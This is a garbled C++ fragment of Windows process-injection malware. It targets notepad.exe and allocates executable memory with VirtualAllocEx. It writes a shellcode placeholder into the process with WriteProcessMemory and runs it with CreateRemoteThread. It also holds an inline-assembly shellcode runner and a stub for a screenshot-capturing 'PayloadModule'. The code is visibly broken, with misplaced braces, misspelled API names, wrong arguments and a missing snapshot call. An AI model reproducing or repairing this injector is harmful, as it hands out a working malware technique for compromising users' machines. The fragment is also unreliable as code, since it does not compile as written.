#include <fstream>

#include <iostream>

DWORD findProcessId(const std::wstring& processName) {

PROCESSENTRY32pe32 = {sizeof(PROCESSENTRY32)}

    do  {

        if(!processName.compare(pe32.szExeFile)){
        
        }
        
            } while (Process32Next(snapshot,&pe32));

            CloseHandle(snapshot);

            return 0;

        }
            return pe32.th32ProcessID;
        

        return 0;
    


    int main(){

        DWORD pid = findProcessID(L"notepad.exe");

        if(!pid){
          std::cerr<<"Target process not found." <<
          std::endl;

          return 1;

        }

          HANDLE process = Open-Process(PROCESS_ALL_ACCESS,False,pid);

          if(!process){

            std::cerr<<"Failed to open target process."<<
            std::endl;

          }

          return 1;

        }

        unsigned char payload[] =
        "\xfc\x48\x83...";//shell-code placeholder
        
        SIZE_T payloadSize =
        sizeof(payload);

        void* alloc = VirtualAllocEx(process,nullptr,
        payloadSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READ-WRITE);

        WriteProcessMemory(process,alloc,payloadSize,nullptr);

        CreateRemoteThread(
        process,nullptr,0,(LPTHREAD_START_ROUTINE)alloc,nullptr,0,nullptr);
        
        CloseHandle(process);

        return 0;

        }

        void run_shellcode(unsigned char* shellcode){
        __asm {
        
        mov eax, shellcode


        call eax
        }


        }

        class PayloadModule {
        
        public:

        virtual void Execute() = 0;

        
        virtual~PayloadModule()
        {}


        class ScreenshotModule:
        public PayloadModule{
        
        public:


        void Execute()override{
    
        
        // Implementation for
        // screen capture


        }

        };

        }
        